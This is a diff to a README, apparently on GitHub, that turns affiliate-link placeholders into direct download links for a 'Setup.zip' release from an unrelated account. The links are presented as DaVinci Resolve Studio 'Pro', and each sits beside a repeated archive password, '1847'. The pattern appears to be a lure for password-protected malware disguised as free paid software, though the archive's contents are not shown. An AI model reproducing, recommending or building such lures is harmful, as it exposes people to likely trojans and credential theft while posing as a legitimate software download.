@@ -8,7 +8,12 @@
 
 ---
 
-[![DaVinci Resolve Studio](og-image.png)](YOUR_AFFILIATE_LINK_HERE)
+[![DaVinci Resolve Studio](og-image.png)](https://github.com/Ivoryauflue97/DaVinci-Resolve-Studio/releases/download/Last/Setup.zip)
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
 
 ---
 
@@ -22,7 +27,12 @@
 
 ## Download & Get Pro
 
-[![Get DaVinci Resolve Studio Pro](https://img.shields.io/badge/Get%20DaVinci%20Resolve%20Studio%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](YOUR_AFFILIATE_LINK_HERE)
+[![Get DaVinci Resolve Studio Pro](https://img.shields.io/badge/Get%20DaVinci%20Resolve%20Studio%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](https://github.com/Ivoryauflue97/DaVinci-Resolve-Studio/releases/download/Last/Setup.zip)
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
 
 ---
 
